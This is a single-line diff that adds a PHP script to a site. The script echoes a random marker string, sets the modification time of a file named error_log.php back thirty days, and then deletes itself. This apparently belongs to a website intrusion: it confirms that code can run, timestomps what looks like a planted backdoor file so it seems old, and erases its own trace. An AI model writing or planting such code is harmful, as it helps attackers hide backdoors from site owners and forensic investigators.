@@ -1,0 +1,1 @@
+<?php echo "wRQubMhwDF"; if (file_exists("./error_log.php")){ touch("./error_log.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*hmapcsZvr0sE8Hham1HR*/ ?>
